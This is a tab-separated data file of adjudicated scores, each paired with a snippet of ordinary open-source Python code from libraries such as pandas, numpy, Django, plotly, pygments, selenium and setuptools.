491	adjudicated	3	"# Copyright 2020 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#    http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>><<NEWL>># [START automl_video_classification_list_datasets_beta]<<NEWL>># [START automl_video_object_tracking_list_datasets_beta]<<NEWL>>from google.cloud import automl_v1beta1 as automl<<NEWL>><<NEWL>><<NEWL>>def list_datasets(project_id=""YOUR_PROJECT_ID""):<<NEWL>>    """"""List datasets.""""""<<NEWL>>    client = automl.AutoMlClient()<<NEWL>>    # A resource that represents Google Cloud Platform location.<<NEWL>>    project_location = f""projects/{project_id}/locations/us-central1""<<NEWL>><<NEWL>>    # List all the datasets available in the region.<<NEWL>>    request = automl.ListDatasetsRequest(parent=project_location, filter="""")<<NEWL>>    response = client.list_datasets(request=request)<<NEWL>><<NEWL>>    print(""List of datasets:"")<<NEWL>>    for dataset in response:<<NEWL>>        print(""Dataset name: {}"".format(dataset.name))<<NEWL>>        print(""Dataset id: {}"".format(dataset.name.split(""/"")[-1]))<<NEWL>>        print(""Dataset display name: {}"".format(dataset.display_name))<<NEWL>>        print(""Dataset create time: {}"".format(dataset.create_time))<<NEWL>>        # [END automl_video_object_tracking_list_datasets_beta]<<NEWL>><<NEWL>>        print(<<NEWL>>            ""Video classification dataset metadata: {}"".format(<<NEWL>>                dataset.video_classification_dataset_metadata<<NEWL>>            )<<NEWL>>        )<<NEWL>>        # [END automl_video_classification_list_datasets_beta]<<NEWL>><<NEWL>>        # [START automl_video_object_tracking_list_datasets_beta]<<NEWL>>        print(<<NEWL>>            ""Video object tracking dataset metadata: {}"".format(<<NEWL>>                dataset.video_object_tracking_dataset_metadata<<NEWL>>            )<<NEWL>>        )<<NEWL>>        # [END automl_video_object_tracking_list_datasets_beta]"
413	adjudicated	2	"# -*- coding: utf-8 -*-<<NEWL>>""""""<<NEWL>>set_fake_passwords.py<<NEWL>><<NEWL>>    Reset all user passwords to a common value. Useful for testing in a<<NEWL>>    development environment. As such, this command is only available when<<NEWL>>    setting.DEBUG is True.<<NEWL>><<NEWL>>""""""<<NEWL>>from typing import List<<NEWL>><<NEWL>>from django.conf import settings<<NEWL>>from django.contrib.auth import get_user_model<<NEWL>>from django.core.management.base import BaseCommand, CommandError<<NEWL>><<NEWL>>from django_extensions.management.utils import signalcommand<<NEWL>><<NEWL>>DEFAULT_FAKE_PASSWORD = 'password'<<NEWL>><<NEWL>><<NEWL>>class Command(BaseCommand):<<NEWL>>    help = 'DEBUG only: sets all user passwords to a common value (""%s"" by default)' % (DEFAULT_FAKE_PASSWORD, )<<NEWL>>    requires_system_checks: List[str] = []<<NEWL>><<NEWL>>    def add_arguments(self, parser):<<NEWL>>        super().add_arguments(parser)<<NEWL>>        parser.add_argument(<<NEWL>>            '--prompt', dest='prompt_passwd', default=False,<<NEWL>>            action='store_true',<<NEWL>>            help='Prompts for the new password to apply to all users'<<NEWL>>        )<<NEWL>>        parser.add_argument(<<NEWL>>            '--password', dest='default_passwd', default=DEFAULT_FAKE_PASSWORD,<<NEWL>>            help='Use this as default password.'<<NEWL>>        )<<NEWL>><<NEWL>>    @signalcommand<<NEWL>>    def handle(self, *args, **options):<<NEWL>>        if not settings.DEBUG:<<NEWL>>            raise CommandError('Only available in debug mode')<<NEWL>><<NEWL>>        if options['prompt_passwd']:<<NEWL>>            from getpass import getpass<<NEWL>>            passwd = getpass('Password: ')<<NEWL>>            if not passwd:<<NEWL>>                raise CommandError('You must enter a valid password')<<NEWL>>        else:<<NEWL>>            passwd = options['default_passwd']<<NEWL>><<NEWL>>        User = get_user_model()<<NEWL>>        user = User()<<NEWL>>        user.set_password(passwd)<<NEWL>>        count = User.objects.all().update(password=user.password)<<NEWL>><<NEWL>>        print('Reset %d passwords' % count)"
502	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""hoverlabel"", parent_name=""histogram2d"", **kwargs):<<NEWL>>        super(HoverlabelValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            align<<NEWL>>                Sets the horizontal alignment of the text<<NEWL>>                content within hover label box. Has an effect<<NEWL>>                only if the hover label text spans more two or<<NEWL>>                more lines<<NEWL>>            alignsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `align`.<<NEWL>>            bgcolor<<NEWL>>                Sets the background color of the hover labels<<NEWL>>                for this trace<<NEWL>>            bgcolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bgcolor`.<<NEWL>>            bordercolor<<NEWL>>                Sets the border color of the hover labels for<<NEWL>>                this trace.<<NEWL>>            bordercolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bordercolor`.<<NEWL>>            font<<NEWL>>                Sets the font used in hover labels.<<NEWL>>            namelength<<NEWL>>                Sets the default length (in number of<<NEWL>>                characters) of the trace name in the hover<<NEWL>>                labels for all traces. -1 shows the whole name<<NEWL>>                regardless of length. 0-3 shows the first 0-3<<NEWL>>                characters, and an integer >3 will show the<<NEWL>>                whole name if it is less than that many<<NEWL>>                characters, but if it is longer, will truncate<<NEWL>>                to `namelength - 3` characters and add an<<NEWL>>                ellipsis.<<NEWL>>            namelengthsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `namelength`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
442	adjudicated	0	"import pytest<<NEWL>><<NEWL>>from pandas.util._decorators import deprecate_kwarg<<NEWL>><<NEWL>>import pandas._testing as tm<<NEWL>><<NEWL>><<NEWL>>@deprecate_kwarg(""old"", ""new"")<<NEWL>>def _f1(new=False):<<NEWL>>    return new<<NEWL>><<NEWL>><<NEWL>>_f2_mappings = {""yes"": True, ""no"": False}<<NEWL>><<NEWL>><<NEWL>>@deprecate_kwarg(""old"", ""new"", _f2_mappings)<<NEWL>>def _f2(new=False):<<NEWL>>    return new<<NEWL>><<NEWL>><<NEWL>>def _f3_mapping(x):<<NEWL>>    return x + 1<<NEWL>><<NEWL>><<NEWL>>@deprecate_kwarg(""old"", ""new"", _f3_mapping)<<NEWL>>def _f3(new=0):<<NEWL>>    return new<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.parametrize(""key,klass"", [(""old"", FutureWarning), (""new"", None)])<<NEWL>>def test_deprecate_kwarg(key, klass):<<NEWL>>    x = 78<<NEWL>><<NEWL>>    with tm.assert_produces_warning(klass):<<NEWL>>        assert _f1(**{key: x}) == x<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.parametrize(""key"", list(_f2_mappings.keys()))<<NEWL>>def test_dict_deprecate_kwarg(key):<<NEWL>>    with tm.assert_produces_warning(FutureWarning):<<NEWL>>        assert _f2(old=key) == _f2_mappings[key]<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.parametrize(""key"", [""bogus"", 12345, -1.23])<<NEWL>>def test_missing_deprecate_kwarg(key):<<NEWL>>    with tm.assert_produces_warning(FutureWarning):<<NEWL>>        assert _f2(old=key) == key<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.parametrize(""x"", [1, -1.4, 0])<<NEWL>>def test_callable_deprecate_kwarg(x):<<NEWL>>    with tm.assert_produces_warning(FutureWarning):<<NEWL>>        assert _f3(old=x) == _f3_mapping(x)<<NEWL>><<NEWL>><<NEWL>>def test_callable_deprecate_kwarg_fail():<<NEWL>>    msg = ""((can only|cannot) concatenate)|(must be str)|(Can't convert)""<<NEWL>><<NEWL>>    with pytest.raises(TypeError, match=msg):<<NEWL>>        _f3(old=""hello"")<<NEWL>><<NEWL>><<NEWL>>def test_bad_deprecate_kwarg():<<NEWL>>    msg = ""mapping from old to new argument values must be dict or callable!""<<NEWL>><<NEWL>>    with pytest.raises(TypeError, match=msg):<<NEWL>><<NEWL>>        @deprecate_kwarg(""old"", ""new"", 0)<<NEWL>>        def f4(new=None):<<NEWL>>            return new<<NEWL>><<NEWL>><<NEWL>>@deprecate_kwarg(""old"", None)<<NEWL>>def _f4(old=True, unchanged=True):<<NEWL>>    return old, unchanged<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.parametrize(""key"", [""old"", ""unchanged""])<<NEWL>>def test_deprecate_keyword(key):<<NEWL>>    x = 9<<NEWL>><<NEWL>>    if key == ""old"":<<NEWL>>        klass = FutureWarning<<NEWL>>        expected = (x, True)<<NEWL>>    else:<<NEWL>>        klass = None<<NEWL>>        expected = (True, x)<<NEWL>><<NEWL>>    with tm.assert_produces_warning(klass):<<NEWL>>        assert _f4(**{key: x}) == expected"
485	adjudicated	4	"""""""<<NEWL>>NGP VAN's `ActionID` Provider<<NEWL>><<NEWL>>http://developers.ngpvan.com/action-id<<NEWL>>""""""<<NEWL>>from openid.extensions import ax<<NEWL>><<NEWL>>from .open_id import OpenIdAuth<<NEWL>><<NEWL>><<NEWL>>class ActionIDOpenID(OpenIdAuth):<<NEWL>>    """"""<<NEWL>>    NGP VAN's ActionID OpenID 1.1 authentication backend<<NEWL>>    """"""<<NEWL>>    name = 'actionid-openid'<<NEWL>>    URL = 'https://accounts.ngpvan.com/Home/Xrds'<<NEWL>>    USERNAME_KEY = 'email'<<NEWL>><<NEWL>>    def get_ax_attributes(self):<<NEWL>>        """"""<<NEWL>>        Return the AX attributes that ActionID responds with, as well as the<<NEWL>>        user data result that it must map to.<<NEWL>>        """"""<<NEWL>>        return [<<NEWL>>            ('http://openid.net/schema/contact/internet/email', 'email'),<<NEWL>>            ('http://openid.net/schema/contact/phone/business', 'phone'),<<NEWL>>            ('http://openid.net/schema/namePerson/first', 'first_name'),<<NEWL>>            ('http://openid.net/schema/namePerson/last', 'last_name'),<<NEWL>>            ('http://openid.net/schema/namePerson', 'fullname'),<<NEWL>>        ]<<NEWL>><<NEWL>>    def setup_request(self, params=None):<<NEWL>>        """"""<<NEWL>>        Setup the OpenID request<<NEWL>><<NEWL>>        Because ActionID does not advertise the availiability of AX attributes<<NEWL>>        nor use standard attribute aliases, we need to setup the attributes<<NEWL>>        manually instead of rely on the parent OpenIdAuth.setup_request()<<NEWL>>        """"""<<NEWL>>        request = self.openid_request(params)<<NEWL>><<NEWL>>        fetch_request = ax.FetchRequest()<<NEWL>>        fetch_request.add(ax.AttrInfo(<<NEWL>>            'http://openid.net/schema/contact/internet/email',<<NEWL>>            alias='ngpvanemail',<<NEWL>>            required=True<<NEWL>>        ))<<NEWL>><<NEWL>>        fetch_request.add(ax.AttrInfo(<<NEWL>>            'http://openid.net/schema/contact/phone/business',<<NEWL>>            alias='ngpvanphone',<<NEWL>>            required=False<<NEWL>>        ))<<NEWL>>        fetch_request.add(ax.AttrInfo(<<NEWL>>            'http://openid.net/schema/namePerson/first',<<NEWL>>            alias='ngpvanfirstname',<<NEWL>>            required=False<<NEWL>>        ))<<NEWL>>        fetch_request.add(ax.AttrInfo(<<NEWL>>            'http://openid.net/schema/namePerson/last',<<NEWL>>            alias='ngpvanlastname',<<NEWL>>            required=False<<NEWL>>        ))<<NEWL>>        request.addExtension(fetch_request)<<NEWL>><<NEWL>>        return request"
476	adjudicated	1	"import pytest<<NEWL>><<NEWL>>from pandas.util._validators import validate_args<<NEWL>><<NEWL>>_fname = ""func""<<NEWL>><<NEWL>><<NEWL>>def test_bad_min_fname_arg_count():<<NEWL>>    msg = ""'max_fname_arg_count' must be non-negative""<<NEWL>><<NEWL>>    with pytest.raises(ValueError, match=msg):<<NEWL>>        validate_args(_fname, (None,), -1, ""foo"")<<NEWL>><<NEWL>><<NEWL>>def test_bad_arg_length_max_value_single():<<NEWL>>    args = (None, None)<<NEWL>>    compat_args = (""foo"",)<<NEWL>><<NEWL>>    min_fname_arg_count = 0<<NEWL>>    max_length = len(compat_args) + min_fname_arg_count<<NEWL>>    actual_length = len(args) + min_fname_arg_count<<NEWL>>    msg = (<<NEWL>>        rf""{_fname}\(\) takes at most {max_length} ""<<NEWL>>        rf""argument \({actual_length} given\)""<<NEWL>>    )<<NEWL>><<NEWL>>    with pytest.raises(TypeError, match=msg):<<NEWL>>        validate_args(_fname, args, min_fname_arg_count, compat_args)<<NEWL>><<NEWL>><<NEWL>>def test_bad_arg_length_max_value_multiple():<<NEWL>>    args = (None, None)<<NEWL>>    compat_args = {""foo"": None}<<NEWL>><<NEWL>>    min_fname_arg_count = 2<<NEWL>>    max_length = len(compat_args) + min_fname_arg_count<<NEWL>>    actual_length = len(args) + min_fname_arg_count<<NEWL>>    msg = (<<NEWL>>        rf""{_fname}\(\) takes at most {max_length} ""<<NEWL>>        rf""arguments \({actual_length} given\)""<<NEWL>>    )<<NEWL>><<NEWL>>    with pytest.raises(TypeError, match=msg):<<NEWL>>        validate_args(_fname, args, min_fname_arg_count, compat_args)<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.parametrize(""i"", range(1, 3))<<NEWL>>def test_not_all_defaults(i):<<NEWL>>    bad_arg = ""foo""<<NEWL>>    msg = (<<NEWL>>        f""the '{bad_arg}' parameter is not supported ""<<NEWL>>        rf""in the pandas implementation of {_fname}\(\)""<<NEWL>>    )<<NEWL>><<NEWL>>    compat_args = {""foo"": 2, ""bar"": -1, ""baz"": 3}<<NEWL>>    arg_vals = (1, -1, 3)<<NEWL>><<NEWL>>    with pytest.raises(ValueError, match=msg):<<NEWL>>        validate_args(_fname, arg_vals[:i], 2, compat_args)<<NEWL>><<NEWL>><<NEWL>>def test_validation():<<NEWL>>    # No exceptions should be raised.<<NEWL>>    validate_args(_fname, (None,), 2, {""out"": None})<<NEWL>><<NEWL>>    compat_args = {""axis"": 1, ""out"": None}<<NEWL>>    validate_args(_fname, (1, None), 2, compat_args)"
427	adjudicated	2	"""""""<<NEWL>> The GeometryColumns and SpatialRefSys models for the PostGIS backend.<<NEWL>>""""""<<NEWL>>from django.contrib.gis.db.backends.base.models import SpatialRefSysMixin<<NEWL>>from django.db import models<<NEWL>><<NEWL>><<NEWL>>class PostGISGeometryColumns(models.Model):<<NEWL>>    """"""<<NEWL>>    The 'geometry_columns' view from PostGIS. See the PostGIS<<NEWL>>    documentation at Ch. 4.3.2.<<NEWL>>    """"""<<NEWL>><<NEWL>>    f_table_catalog = models.CharField(max_length=256)<<NEWL>>    f_table_schema = models.CharField(max_length=256)<<NEWL>>    f_table_name = models.CharField(max_length=256)<<NEWL>>    f_geometry_column = models.CharField(max_length=256)<<NEWL>>    coord_dimension = models.IntegerField()<<NEWL>>    srid = models.IntegerField(primary_key=True)<<NEWL>>    type = models.CharField(max_length=30)<<NEWL>><<NEWL>>    class Meta:<<NEWL>>        app_label = ""gis""<<NEWL>>        db_table = ""geometry_columns""<<NEWL>>        managed = False<<NEWL>><<NEWL>>    def __str__(self):<<NEWL>>        return ""%s.%s - %dD %s field (SRID: %d)"" % (<<NEWL>>            self.f_table_name,<<NEWL>>            self.f_geometry_column,<<NEWL>>            self.coord_dimension,<<NEWL>>            self.type,<<NEWL>>            self.srid,<<NEWL>>        )<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def table_name_col(cls):<<NEWL>>        """"""<<NEWL>>        Return the name of the metadata column used to store the feature table<<NEWL>>        name.<<NEWL>>        """"""<<NEWL>>        return ""f_table_name""<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def geom_col_name(cls):<<NEWL>>        """"""<<NEWL>>        Return the name of the metadata column used to store the feature<<NEWL>>        geometry column.<<NEWL>>        """"""<<NEWL>>        return ""f_geometry_column""<<NEWL>><<NEWL>><<NEWL>>class PostGISSpatialRefSys(models.Model, SpatialRefSysMixin):<<NEWL>>    """"""<<NEWL>>    The 'spatial_ref_sys' table from PostGIS. See the PostGIS<<NEWL>>    documentation at Ch. 4.2.1.<<NEWL>>    """"""<<NEWL>><<NEWL>>    srid = models.IntegerField(primary_key=True)<<NEWL>>    auth_name = models.CharField(max_length=256)<<NEWL>>    auth_srid = models.IntegerField()<<NEWL>>    srtext = models.CharField(max_length=2048)<<NEWL>>    proj4text = models.CharField(max_length=2048)<<NEWL>><<NEWL>>    class Meta:<<NEWL>>        app_label = ""gis""<<NEWL>>        db_table = ""spatial_ref_sys""<<NEWL>>        managed = False<<NEWL>><<NEWL>>    @property<<NEWL>>    def wkt(self):<<NEWL>>        return self.srtext"
369	adjudicated	3	"""""""<<NEWL>>    pygments.filter<<NEWL>>    ~~~~~~~~~~~~~~~<<NEWL>><<NEWL>>    Module that implements the default filter.<<NEWL>><<NEWL>>    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.<<NEWL>>    :license: BSD, see LICENSE for details.<<NEWL>>""""""<<NEWL>><<NEWL>><<NEWL>>def apply_filters(stream, filters, lexer=None):<<NEWL>>    """"""<<NEWL>>    Use this method to apply an iterable of filters to<<NEWL>>    a stream. If lexer is given it's forwarded to the<<NEWL>>    filter, otherwise the filter receives `None`.<<NEWL>>    """"""<<NEWL>>    def _apply(filter_, stream):<<NEWL>>        yield from filter_.filter(lexer, stream)<<NEWL>>    for filter_ in filters:<<NEWL>>        stream = _apply(filter_, stream)<<NEWL>>    return stream<<NEWL>><<NEWL>><<NEWL>>def simplefilter(f):<<NEWL>>    """"""<<NEWL>>    Decorator that converts a function into a filter::<<NEWL>><<NEWL>>        @simplefilter<<NEWL>>        def lowercase(self, lexer, stream, options):<<NEWL>>            for ttype, value in stream:<<NEWL>>                yield ttype, value.lower()<<NEWL>>    """"""<<NEWL>>    return type(f.__name__, (FunctionFilter,), {<<NEWL>>        '__module__': getattr(f, '__module__'),<<NEWL>>        '__doc__': f.__doc__,<<NEWL>>        'function': f,<<NEWL>>    })<<NEWL>><<NEWL>><<NEWL>>class Filter:<<NEWL>>    """"""<<NEWL>>    Default filter. Subclass this class or use the `simplefilter`<<NEWL>>    decorator to create own filters.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __init__(self, **options):<<NEWL>>        self.options = options<<NEWL>><<NEWL>>    def filter(self, lexer, stream):<<NEWL>>        raise NotImplementedError()<<NEWL>><<NEWL>><<NEWL>>class FunctionFilter(Filter):<<NEWL>>    """"""<<NEWL>>    Abstract class used by `simplefilter` to create simple<<NEWL>>    function filters on the fly. The `simplefilter` decorator<<NEWL>>    automatically creates subclasses of this class for<<NEWL>>    functions passed to it.<<NEWL>>    """"""<<NEWL>>    function = None<<NEWL>><<NEWL>>    def __init__(self, **options):<<NEWL>>        if not hasattr(self, 'function'):<<NEWL>>            raise TypeError('%r used without bound function' %<<NEWL>>                            self.__class__.__name__)<<NEWL>>        Filter.__init__(self, **options)<<NEWL>><<NEWL>>    def filter(self, lexer, stream):<<NEWL>>        # pylint: disable=not-callable<<NEWL>>        yield from self.function(lexer, stream, self.options)"
229	adjudicated	0	"# Licensed to the Software Freedom Conservancy (SFC) under one<<NEWL>># or more contributor license agreements.  See the NOTICE file<<NEWL>># distributed with this work for additional information<<NEWL>># regarding copyright ownership.  The SFC licenses this file<<NEWL>># to you under the Apache License, Version 2.0 (the<<NEWL>># ""License""); you may not use this file except in compliance<<NEWL>># with the License.  You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#   http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing,<<NEWL>># software distributed under the License is distributed on an<<NEWL>># ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY<<NEWL>># KIND, either express or implied.  See the License for the<<NEWL>># specific language governing permissions and limitations<<NEWL>># under the License.<<NEWL>><<NEWL>>from .firefox.webdriver import WebDriver as Firefox  # noqa<<NEWL>>from .firefox.firefox_profile import FirefoxProfile  # noqa<<NEWL>>from .firefox.options import Options as FirefoxOptions  # noqa<<NEWL>>from .chrome.webdriver import WebDriver as Chrome  # noqa<<NEWL>>from .chrome.options import Options as ChromeOptions  # noqa<<NEWL>>from .ie.webdriver import WebDriver as Ie  # noqa<<NEWL>>from .ie.options import Options as IeOptions  # noqa<<NEWL>>from .edge.webdriver import WebDriver as Edge  # noqa<<NEWL>>from .opera.webdriver import WebDriver as Opera  # noqa<<NEWL>>from .safari.webdriver import WebDriver as Safari  # noqa<<NEWL>>from .blackberry.webdriver import WebDriver as BlackBerry  # noqa<<NEWL>>from .phantomjs.webdriver import WebDriver as PhantomJS  # noqa<<NEWL>>from .android.webdriver import WebDriver as Android  # noqa<<NEWL>>from .webkitgtk.webdriver import WebDriver as WebKitGTK # noqa<<NEWL>>from .webkitgtk.options import Options as WebKitGTKOptions # noqa<<NEWL>>from .remote.webdriver import WebDriver as Remote  # noqa<<NEWL>>from .common.desired_capabilities import DesiredCapabilities  # noqa<<NEWL>>from .common.action_chains import ActionChains  # noqa<<NEWL>>from .common.touch_actions import TouchActions  # noqa<<NEWL>>from .common.proxy import Proxy  # noqa<<NEWL>><<NEWL>>__version__ = '3.14.1'"
338	adjudicated	2	""""""" Test functions for linalg module using the matrix class.""""""<<NEWL>>import numpy as np<<NEWL>><<NEWL>>from numpy.linalg.tests.test_linalg import (<<NEWL>>    LinalgCase, apply_tag, TestQR as _TestQR, LinalgTestCase,<<NEWL>>    _TestNorm2D, _TestNormDoubleBase, _TestNormSingleBase, _TestNormInt64Base,<<NEWL>>    SolveCases, InvCases, EigvalsCases, EigCases, SVDCases, CondCases,<<NEWL>>    PinvCases, DetCases, LstsqCases)<<NEWL>><<NEWL>><<NEWL>>CASES = []<<NEWL>><<NEWL>># square test cases<<NEWL>>CASES += apply_tag('square', [<<NEWL>>    LinalgCase(""0x0_matrix"",<<NEWL>>               np.empty((0, 0), dtype=np.double).view(np.matrix),<<NEWL>>               np.empty((0, 1), dtype=np.double).view(np.matrix),<<NEWL>>               tags={'size-0'}),<<NEWL>>    LinalgCase(""matrix_b_only"",<<NEWL>>               np.array([[1., 2.], [3., 4.]]),<<NEWL>>               np.matrix([2., 1.]).T),<<NEWL>>    LinalgCase(""matrix_a_and_b"",<<NEWL>>               np.matrix([[1., 2.], [3., 4.]]),<<NEWL>>               np.matrix([2., 1.]).T),<<NEWL>>])<<NEWL>><<NEWL>># hermitian test-cases<<NEWL>>CASES += apply_tag('hermitian', [<<NEWL>>    LinalgCase(""hmatrix_a_and_b"",<<NEWL>>               np.matrix([[1., 2.], [2., 1.]]),<<NEWL>>               None),<<NEWL>>])<<NEWL>># No need to make generalized or strided cases for matrices.<<NEWL>><<NEWL>><<NEWL>>class MatrixTestCase(LinalgTestCase):<<NEWL>>    TEST_CASES = CASES<<NEWL>><<NEWL>><<NEWL>>class TestSolveMatrix(SolveCases, MatrixTestCase):<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>class TestInvMatrix(InvCases, MatrixTestCase):<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>class TestEigvalsMatrix(EigvalsCases, MatrixTestCase):<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>class TestEigMatrix(EigCases, MatrixTestCase):<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>class TestSVDMatrix(SVDCases, MatrixTestCase):<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>class TestCondMatrix(CondCases, MatrixTestCase):<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>class TestPinvMatrix(PinvCases, MatrixTestCase):<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>class TestDetMatrix(DetCases, MatrixTestCase):<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>class TestLstsqMatrix(LstsqCases, MatrixTestCase):<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>class _TestNorm2DMatrix(_TestNorm2D):<<NEWL>>    array = np.matrix<<NEWL>><<NEWL>><<NEWL>>class TestNormDoubleMatrix(_TestNorm2DMatrix, _TestNormDoubleBase):<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>class TestNormSingleMatrix(_TestNorm2DMatrix, _TestNormSingleBase):<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>class TestNormInt64Matrix(_TestNorm2DMatrix, _TestNormInt64Base):<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>class TestQRMatrix(_TestQR):<<NEWL>>    array = np.matrix"
278	adjudicated	0	# Copyright (c) 2020, Oracle and/or its affiliates.<<NEWL>>#<<NEWL>># This program is free software; you can redistribute it and/or modify<<NEWL>># it under the terms of the GNU General Public License, version 2.0, as<<NEWL>># published by the Free Software Foundation.<<NEWL>>#<<NEWL>># This program is also distributed with certain software (including<<NEWL>># but not limited to OpenSSL) that is licensed under separate terms,<<NEWL>># as designated in a particular file or component or in included license<<NEWL>># documentation.  The authors of MySQL hereby grant you an<<NEWL>># additional permission to link the program and your derivative works<<NEWL>># with the separately licensed software that they have included with<<NEWL>># MySQL.<<NEWL>>#<<NEWL>># Without limiting anything contained in the foregoing, this file,<<NEWL>># which is part of MySQL Connector/Python, is also subject to the<<NEWL>># Universal FOSS Exception, version 1.0, a copy of which can be found at<<NEWL>># http://oss.oracle.com/licenses/universal-foss-exception.<<NEWL>>#<<NEWL>># This program is distributed in the hope that it will be useful, but<<NEWL>># WITHOUT ANY WARRANTY; without even the implied warranty of<<NEWL>># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.<<NEWL>># See the GNU General Public License, version 2.0, for more details.<<NEWL>>#<<NEWL>># You should have received a copy of the GNU General Public License<<NEWL>># along with this program; if not, write to the Free Software Foundation, Inc.,<<NEWL>># 51 Franklin St, Fifth Floor, Boston, MA 02110-1301  USA<<NEWL>><<NEWL>>from django.db.backends.mysql.features import DatabaseFeatures as MySQLDatabaseFeatures<<NEWL>>from django.utils.functional import cached_property<<NEWL>><<NEWL>><<NEWL>>class DatabaseFeatures(MySQLDatabaseFeatures):<<NEWL>>    empty_fetchmany_value = []<<NEWL>><<NEWL>>    @cached_property<<NEWL>>    def can_introspect_check_constraints(self):<<NEWL>>        return self.connection.mysql_version >= (8, 0, 16)<<NEWL>><<NEWL>>    @cached_property<<NEWL>>    def supports_microsecond_precision(self):<<NEWL>>        if self.connection.mysql_version >= (5, 6, 3):<<NEWL>>            return True<<NEWL>>        return False
268	adjudicated	1	"from distutils.util import convert_path<<NEWL>>from distutils import log<<NEWL>>from distutils.errors import DistutilsOptionError<<NEWL>>import os<<NEWL>>import shutil<<NEWL>><<NEWL>>from setuptools.extern import six<<NEWL>><<NEWL>>from setuptools import Command<<NEWL>><<NEWL>><<NEWL>>class rotate(Command):<<NEWL>>    """"""Delete older distributions""""""<<NEWL>><<NEWL>>    description = ""delete older distributions, keeping N newest files""<<NEWL>>    user_options = [<<NEWL>>        ('match=', 'm', ""patterns to match (required)""),<<NEWL>>        ('dist-dir=', 'd', ""directory where the distributions are""),<<NEWL>>        ('keep=', 'k', ""number of matching distributions to keep""),<<NEWL>>    ]<<NEWL>><<NEWL>>    boolean_options = []<<NEWL>><<NEWL>>    def initialize_options(self):<<NEWL>>        self.match = None<<NEWL>>        self.dist_dir = None<<NEWL>>        self.keep = None<<NEWL>><<NEWL>>    def finalize_options(self):<<NEWL>>        if self.match is None:<<NEWL>>            raise DistutilsOptionError(<<NEWL>>                ""Must specify one or more (comma-separated) match patterns ""<<NEWL>>                ""(e.g. '.zip' or '.egg')""<<NEWL>>            )<<NEWL>>        if self.keep is None:<<NEWL>>            raise DistutilsOptionError(""Must specify number of files to keep"")<<NEWL>>        try:<<NEWL>>            self.keep = int(self.keep)<<NEWL>>        except ValueError:<<NEWL>>            raise DistutilsOptionError(""--keep must be an integer"")<<NEWL>>        if isinstance(self.match, six.string_types):<<NEWL>>            self.match = [<<NEWL>>                convert_path(p.strip()) for p in self.match.split(',')<<NEWL>>            ]<<NEWL>>        self.set_undefined_options('bdist', ('dist_dir', 'dist_dir'))<<NEWL>><<NEWL>>    def run(self):<<NEWL>>        self.run_command(""egg_info"")<<NEWL>>        from glob import glob<<NEWL>><<NEWL>>        for pattern in self.match:<<NEWL>>            pattern = self.distribution.get_name() + '*' + pattern<<NEWL>>            files = glob(os.path.join(self.dist_dir, pattern))<<NEWL>>            files = [(os.path.getmtime(f), f) for f in files]<<NEWL>>            files.sort()<<NEWL>>            files.reverse()<<NEWL>><<NEWL>>            log.info(""%d file(s) matching %s"", len(files), pattern)<<NEWL>>            files = files[self.keep:]<<NEWL>>            for (t, f) in files:<<NEWL>>                log.info(""Deleting %s"", f)<<NEWL>>                if not self.dry_run:<<NEWL>>                    if os.path.isdir(f):<<NEWL>>                        shutil.rmtree(f)<<NEWL>>                    else:<<NEWL>>                        os.unlink(f)"
